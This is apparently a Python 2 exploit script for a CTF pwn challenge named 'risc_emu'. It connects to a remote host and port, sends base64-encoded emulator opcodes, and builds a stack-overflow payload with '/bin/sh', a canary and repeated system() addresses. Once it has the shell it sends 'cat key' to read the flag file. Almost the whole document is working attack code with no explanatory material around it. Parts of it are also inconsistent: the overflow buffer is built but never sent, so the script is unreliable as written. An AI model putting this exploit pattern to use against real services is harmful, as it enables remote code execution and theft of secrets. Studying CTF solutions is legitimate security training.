__author__ = 'HuyNA'
"""
    risc_emuPwning : 100

    nobody cares about this service nc 54.218.22.41 4545
"""

"""
    opcode: 0 -> 9

    socat TCP-LISTEN:4545,reuseaddr,fork EXEC:./task
"""

import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "54.218.22.41"
local_host="192.168.248.156"
port = 4545
s.connect((host, port))
#s.connect((local_host, port))

sys.stdin.read(1)
print "press enter to continue ... "

xor_0_command = "\x06\x00\x00\x00"
xor_1_command = "\x06\x01\x01\x01"
xor_2_command = "\x06\x02\x02\x02"


#canary_index_string = struct.unpack("<b", canary_index);

#add_command = "\x01"+canary_index_string+"\x00\x01"


def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

def send_data(s, command):
    print recv_until(s, "base64'd:\n")
    temp = base64.b64encode(command) + "\n"
    s.send(temp)
    print recv_until(s, "now!\n")
    print recv_until(s, "VM.....\n")
    return 0
"""
time.sleep(0.01)
send_data(xor_0_command)
sys.stdin.read(1)
time.sleep(0.01)
send_data(xor_1_command)
sys.stdin.read(1)
time.sleep(0.01)
send_data(xor_2_command)
"""
print "[+] send sub_command"
add_function_index = 0xC0/4 & 0x000000FF
add_function_index_string = struct.pack("<b", add_function_index);
sub_command = "\x03"+add_function_index_string+"\x0d\xb0"
time.sleep(0.01)
send_data(s, sub_command)

# 0x0004010D0 00401E80
print "[+] send final_command"
system_address_string = struct.pack("<Q", 0x0004010D0);
final_command = "\x00/bin/sh\x00"
canary = "\x00"*4
overflow_data = final_command + (128-len(final_command))*'a' + canary + 'b'*16 + system_address_string*10 + "\n"
time.sleep(0.01)
print recv_until(s, "base64'd:\n")
temp = base64.b64encode(final_command) + "\n"
s.send(temp)
#print recv_until(s, "now!\n")

print "[+] wait ...."

time.sleep(1)
s.send("cat key\n")

print s.recv(1024)

# b *0x0000401AFA

# base64 decode b *0x000401AA3 b *0x000401C66